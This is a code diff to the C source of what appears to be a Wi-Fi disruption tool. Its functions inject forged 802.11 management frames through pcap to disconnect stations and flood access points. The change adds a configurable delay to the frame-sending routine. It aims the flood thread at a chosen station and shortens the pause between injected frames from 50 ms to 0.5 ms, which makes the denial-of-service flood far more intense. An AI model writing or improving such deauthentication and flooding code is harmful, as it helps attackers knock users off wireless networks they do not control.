@@ -6,7 +6,7 @@ static void action_distrupt_station(struct loki_state*);
 static void action_distrupt_network(struct loki_state*);
 static void action_flood_ap(struct loki_state*);
 static void *flood(void*);
-static void action_send_disruption(uint8_t*, uint8_t*, uint8_t*, uint16_t, uint8_t, pcap_t*);
+static void action_send_disruption(uint8_t*, uint8_t*, uint8_t*, uint16_t, uint8_t, pcap_t*, uint32_t);
 
 static flood_ap = 0;
 
@@ -201,7 +201,7 @@ void action_distrupt_station(struct loki_state *state) {
 	char *status = (char*)malloc(sizeof(char)*48);
 	sprintf(status, "Disrupt station %s -> %s ", print_mac_address(macAp), print_mac_address(macSta));
 	set_status_message(status, state);
-	action_send_disruption(macAp, macSta, macAp, 10, 0, state->handle);
+	action_send_disruption(macAp, macSta, macAp, 10, 0, state->handle, 50000);
 }
 
 void action_distrupt_network(struct loki_state *state) {
@@ -223,10 +223,10 @@ void action_distrupt_network(struct loki_state *state) {
 	sprintf(status, "Disrupt network %s -> %s ", print_mac_address(macAp), print_mac_address(macSta));
 	set_status_message(status, state);
 
-	action_send_disruption(macAp, macSta, macAp, 10, 1, state->handle);
+	action_send_disruption(macAp, macSta, macAp, 10, 1, state->handle, 50000);
 }
 
-void action_send_disruption(uint8_t *macAp, uint8_t *macSta, uint8_t *bssid, uint16_t num, uint8_t broadcast, pcap_t *handle) {
+void action_send_disruption(uint8_t *macAp, uint8_t *macSta, uint8_t *bssid, uint16_t num, uint8_t broadcast, pcap_t *handle, uint32_t sleep) {
 	struct header_radiotap *tap;
 	struct mac80211_management_hdr *headerToSta, *headerToAp;
 	struct mac80211_control ctrl;
@@ -268,7 +268,7 @@ void action_send_disruption(uint8_t *macAp, uint8_t *macSta, uint8_t *bssid, uin
 		if(!broadcast)
 			pcap_inject(handle, (void*)packetToAp, (int)lenAp);
 		
-		usleep(50000);
+		usleep(sleep);
 		
 		if(!broadcast)
 			free(packetToAp);
@@ -300,8 +300,8 @@ void action_flood_ap(struct loki_state *state) {
 void *flood(void *data) {
 	struct loki_state *state = (struct loki_state*)data;
 	struct beacon_frame_item *item = state->log->beacon.list;
-	uint8_t macAp[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff },
-		*macSta;
+	struct macaddr_list_item *addr;
+	uint8_t *macAp, *macSta;
 	uint16_t i;
 
 	i = 0;
@@ -313,7 +313,19 @@ void *flood(void *data) {
 
 	macSta = item->mac;
 
+	i = 0;
+	if((addr = item->list) == NULL)
+		return;
+
+	do {
+		if(i++ == item->sta_selected)
+			break;
+
+	} while( (addr = addr->next) != NULL);
+
+	macAp = addr->addr;
+
 	while(flood_ap) {
-		action_send_disruption(macAp, macSta, macAp, 10, 1, state->handle);
+		action_send_disruption(macAp, macSta, macAp, 10, 1, state->handle, 500);
 	}
 }
